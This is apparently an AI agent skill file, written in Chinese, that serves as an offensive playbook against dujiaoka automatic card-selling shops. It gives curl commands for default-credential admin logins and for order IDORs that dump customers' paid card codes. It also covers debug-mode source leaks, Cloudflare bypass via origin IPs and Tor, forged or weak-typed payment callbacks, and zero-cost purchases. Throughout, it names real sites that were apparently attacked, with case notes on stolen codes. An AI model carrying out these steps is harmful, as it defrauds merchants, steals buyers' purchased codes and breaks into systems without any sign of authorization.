---
name: chinese-faka-dujiaoka
description: "Use for 独角数卡/dujiaoka/Apple ID发卡 Web."
version: 1.1.0
tags: [faka, dujiaoka, apple-id, 发卡, dcat-admin, yipay]
---

# 中国自动发卡 · 独角数卡类

Laravel + Dcat Admin 的开源自动售货（独角数卡 / dujiaoka）及同构改皮站。典型业务：海外 Apple ID、卡密、游戏 CDK。

交叉：活靶纪律走 `pentest-execution`（若写入被拒先 `hermes curator adopt`）；通用 Web 注入转 `hack-skills`/`web-sec`。用户自有 `chinese-faka-ai-recharge` 若存在且冲突，以 curator adopt 后的版本为准。

## When to Use

- 页面/标题出现「独角数卡」「自动发货」「卡密」「海外 apple id」
- 后台路径 `/admin` 或改名 `/savior`，静态资源 `vendor/dcat-admin`
- 前端模板变体：luna（默认）、dcat、**Hyper**（`/assets/hyper/css/`、`hyper.css`、`data-layout="topnav"`）——均为同一 Laravel 后端
- robots 含 `/pay/` `/bill/` `/order-search/` `/detail-order-sn/` `/pay-gateway/`
- 支付跳转易支付（yipay/epay）：`submit.php` + `pid` + MD5 `sign` + `notify_url`

Don't use for: Flutter IM 企业号分服（`chinese-private-im`）；USDT 授权钓鱼店（另案）。

## ACTION REQUIRED

1. `NOW`: 读 `references/dujiaoka-attack-surface.md`
2. `NOW`: 确认栈（Laravel cookie / Dcat / luna 模板）与后台路径（默认 `/admin`，常见改名）
3. `NEXT`: 默认口令 `admin/admin` → 验菜单权限；**并行**测前台订单 IDOR（SN **和邮箱**）
4. `ACT`: 有邮箱 IDOR 就先 dump 已付卡密；否则下单拿 SN → 还原支付/notify；有 merchant key 再伪回调
5. Hyper+epusdt：`pay-gateway` 跳柜台 → HTML 扮 `order-trade-id` → 直连网关 `GET /pay/check-status/{trade_id}`（常无签名）→ 再打 PATH_INFO 回调

## 用户纪律（CRITICAL）

- **禁止优先走纯字典喷密/撞签**。用户会直接骂「怎么又开始爆破了」。有旁路（邮箱/SN IDOR、默认口令、未授权导出、支付伪签、配置泄露）必须先走旁路。
- 卡住时复盘：已控会话/已出卡密/遗漏查询面，而不是加长 rockyou。

## 快路径

```bash
# 指纹
curl -skI https://TARGET/ | rg -i 'xsrf|laravel|set-cookie'
curl -sk https://TARGET/robots.txt
# 后台（改名常见 /savior）
curl -sk https://TARGET/savior/auth/login | rg -i 'dcat-admin|独角|username'
# 默认口令（JSON/AJAX）
# username=admin password=admin + _token
# 订单查询 IDOR（常无 search_pwd）
# POST /search-order-by-sn     order_sn=...
# POST /search-order-by-email  email=...   # 高危：已付单可直接出卡密
# 短数字 QQ 常命中：<EMAIL-REDACTED> / <EMAIL-REDACTED> / <EMAIL-REDACTED>
# 订单状态 oracle（JSON，可脚本化）
# GET /check-order-status/{SN}  → {"code":400000}=wait / 200=success / 400001=expired
# 卡密导出
# GET /detail-order-sn/{SN}/export-carmis  → 下载卡密文件（需已支付订单）
# 注册页（可能需邀请码）
# GET /register  → 字段: invite_code, email, password, confirm_password
```

## Debug 模式源码泄露（高频）

独角数卡生产站常忘关 `APP_DEBUG=true`。最佳触发点：

```bash
# 无参数打 notify → 触发 Undefined array key 异常 → Ignition 全量泄露
curl -sk https://TARGET/pay/yipay/notify_url
# 泄露内容：YipayController.php 源码（验签算法）、绝对路径、Laravel/PHP 版本、中间件链
# pay_handleroute 校验逻辑、ksort+md5 签名算法全可读
# POST 同路径会触发 MethodNotAllowed 异常，同样泄露源码
```

此泄露等价于白盒审计支付链路——拿到验签算法后只差 `merchant_pem` 密钥。

## Pitfalls

- **登录成功 ≠ 超管**：Dcat 角色可阉到几乎全菜单「无权访问」——报口令命中时必须同时报权限面
- 后台路径常改掉 `/admin`（例 `/savior`）；只扫 `/admin` 会漏
- `search-order-by-sn` 可能无查询密码即可看详情；**`search-order-by-email` 同样常无 pwd，且已付单会吐 `data-clipboard-text` 卡密**——优先扫短数字邮箱，不要先喷商户密码
- `detail-order-sn/{sn}` 对无效 SN 也可能同页模板（看标题/内容，别只看 200）
- CSRF：邮箱查单每次请求最好 **新 cookie jar + 新 `_token`**，否则易 419 Page Expired
- 易支付 `notify_url` 可能 **只收 GET**（POST→405）；伪造前先对空/错签探方法
- `merchant_pem` 常为随机串（文档示例即 32 位），rockyou 撞签可放弃；`api.php?act=refund` **可能不验 key**（空 key 也回「未开启自助退款」）——别当 oracle
- **2.0.5 Vpay**：官方紧急通知删 `VpayController.php`；站上 `/pay/vpay/*` 若统一 500（不是 `fail`）= 控制器已删，别继续伪签浪费回合。2.0.6 才普遍加 `pay_handleroute` 校验
- 支付常双栈：Vue `py.*` + 经典彩虹 `pay.*`（`/user/login.php`、`ajax.php?act=login`）；经典口占位是邮箱/手机，pid 走密钥登录
- 宝塔 `:8888`：`/password` `/site` `/system` `/api` **302→/login 无 Set-Cookie = 假阳性**；真入口应直接出登录表单或带 session cookie
- 本机 IP 被风控后前台超时 ≠ 站挂：换代理/Host 头打源 IP；apex/公司站可能仍通
- 创建订单 `by_amount=0/-1` 常被拒；不要把「能进 bill 页」当成已支付
- **邮箱 IDOR 命中 ≠ 已付卡密**：`<EMAIL-REDACTED>` 等短 QQ 常拉出「已过期」单+SN，页面有「卡密」文案但无 `data-clipboard-text`。只有已付且剪贴属性有值才算出卡——别把过期单清单报成用户数据
- **nginx 403 × PATH_INFO**：`/pay/epusdt/notify_url` 被 nginx 403 时，`/index.php/pay/epusdt/notify_url` 常打到 PHP。GET 缺签回纯文本 `fail`=回调活只差签名；POST 空体可能 500 但 `APP_DEBUG=false` 只回 Laravel Nunito「Server Error」不吐栈——别当 Ignition 泄源码
- **Hyper `pay-gateway` 跳 epusdt 柜台**：`/pay-gateway/%252Fpay%252Fepusdt/epusdt/{SN}` → 302 `/pay/epusdt/epusdt/{SN}` → 柜台 HTML。扮 `id="order-trade-id"`（形如 `202609281790535793442162`）和收款地址
- **epusdt 柜台查单常无鉴权**：`GET https://GATEWAY/pay/check-status/{trade_id}` → `{status:1|3}`；`GET /pay/display-order-id/{trade_id}` → `{display_order_id, site_host}`。写面 POST 同路 405，`/api/v1/order/*` 仍要签名。邻近 trade_id ±几步常空——别盲枚。详见 `references/epusdt-unauth-check-status.md`
- **CF 1006 / 本机 IP 403 ≠ 站挂**：同 host Tor SOCKS5 常直接 200（邮箱查单、`/xiaoniu888/auth/login`、PATH_INFO 回调）。别把攻击 IP 被封写成目标下线
- **Host 换到 Chatwoot 源站 ≠ 发卡源站**：客服子域 `kefu.*` 的源 IP 上任意 Host 都回 Chatwoot SPA。`/xiaoniu888` 在该 IP 上 404。别把客服源当独角 Laravel
- **Cloudflare 绕过**：发卡站常用 CF，但 crt.sh 子域名（`www`/`pay`/`test`）常指向非代理源 IP——`dig +short www.TARGET` 或 `pay.TARGET` 可能直出源 IP——拿到后 `curl -sk https://SOURCE_IP/ -H 'Host: TARGET'` 直连，后续后台/宝塔探测绕过 CF WAF
- **后台路径改名深度**：常见路径（admin/savior/manage/backend/system/panel/console/dashboard 等）可全 404。改名可能极端——优先从 Debug 泄露的源码/路由、JS chunk、或 crt.sh 子域名（如 `admin.TARGET`）反推
- **robots `Disallow: /admin123/` 常是复制模板**：主站该路径 404、真后台仍是 `/xiaoniu888` 一类改名；同皮兄弟站（sitemap `loc` 指向的另一品牌域）却可能真开 `/admin123`。以 HTTP 标题「独角数卡 - 后台控制中心」为准，别只信 robots
- **sitemap 兄弟域**：`sitemap.xml` 的 `<loc>` 可能指向另一套独角（例 by.xiaoniu.info robots → www.aws158.com）。跟打同皮，后台前缀不必相同
- **crt.sh 打客服/支付 apex**：`xiaoniu.info` / `usdtpay188.com` 一类能拉出收码 FastAPI、工单、另一套 Hyper。非 CF IP 仍要 Host+body 指纹——Squid `Invalid URL` / Chatwoot SPA ≠ 发卡源站
- **兄弟 Hyper 若 APP_DEBUG**：`GET /pay/yipay/notify_url` → Ignition + 绝对路径 + `YipayController` 片段（先 `detailOrderSN(out_trade_no)` 再核 `pay_handleroute`）。`/_ignition/health-check` `can_execute_commands:true` 只说明 execute-solution 路由活。**phar 链未在本案 getshell，禁止当可靠 RCE 重跑**。`MakeViewVariableOptionalSolution` 禁止把 `.env` 当 `viewFile`（匹配会 `file_put_contents`）
- **Ignition JSON ≠ 源码片段**：`Accept: application/json` 空 notify 只回 `file/line/trace`，**没有 `code_snippet`**。要白盒必须 HTML（浏览器默认 Accept）打 500。`POST /pay/epusdt/notify_url` 空体 → `Undefined index: order_id`；GET 同路 405 只支持 POST
- **epusdt 验签密钥是 `merchant_id` 不是 `merchant_pem`**：官方 `EpusdtController`：`gateway()` 用 `merchant_id` 签 create-transaction、`merchant_pem` 是 **API URL**（`$client->post($this->payGateway->merchant_pem)`）；`notifyUrl` 用 `order_id` 查单、`epusdtSign($data, $payGateway->merchant_id)`（ksort 跳过空值/`signature`，`md5(k=v&…+$signKey)`）、成功 `completedOrder(order_id, amount, trade_id)` 回纯文本 `ok`。`pay_handleroute` 校验串是 `pay/epusdt`（**无**前导 `/`，跟 yipay 的 `/pay/yipay` 不一样）。短数字/SN/网关 URL 当 key 一律 `fail`——token 是随机串，别喷
- **收银台「支付网关异常！签名认证错误」≠ 回调验签失败**：是 `create-transaction` 时用 `merchant_id` 当 epusdt API token 被网关 401，**没出 trade_id**。这时伪 notify 浪费回合——先看柜台是否真有 `order-trade-id`
- **同机 Host 分流**：apex（aws158.com）nginx 403 `/pay/epusdt/notify_url` 时，crt 兄弟 Host（`by.xiaoniu.info`）可能直打 PHP。用同一 SN 换 Host 再 POST

## References

- `references/dujiaoka-attack-surface.md` — 路由、默认凭据、订单/邮箱 IDOR、yipay 签名/notify、商户面板登录体
- `references/case-apps-gx3xx-2026-09.md` — apps.gx3xx.com 实战摘要（邮箱 IDOR 出卡、Vpay 已删、宝塔假阳性）
- `references/case-iospifa-2026-09.md` — iospifa.com 实战摘要（Hyper模板、Debug泄露源码、邮箱IDOR出卡21个、CF绕过源IP、后台路径极端改名）
- `references/epusdt-unauth-check-status.md` — Hyper pay-gateway → 柜台 trade_id → epusdt 无鉴权查单 / PATH_INFO 回调
- `references/case-kuaishou168-2026-09.md` — kuaishou168.com 实战摘要（Hyper+epusdt、PATH_INFO fail、邮箱IDOR过期单、CF1006/Tor、Chatwoot源站不是发卡机）

## 通道错配 0 元购 + sign 反推（2026-10 apple-giftcards）
- 商品绑定了**未开启**的支付通道 → 下单直接算已支付，0 元拿到卡密（先枚举可用通道 ID，再挑未启用那个下单）
- 前端 sign 由 JS 生成，反推参数顺序后离线造签名 → 任意改价/改数量
- 判据：下单响应 `code=1` 且 `pay_url` 为空/无跳转 = 走内部余额链路，重点查

## 回调弱类型 → 0 元购（2026-10 joinplus 实锤）
- `sign: true` + `X-HTTP-Method-Override: GET` 打 `/pay/yipay/notify_url` → 订单 completed 自动发卡
- 限购只校验单笔，`quantity` 填库存上限一次全发
- 细节见 `dujiaoka-yipay-notify-weaktype`
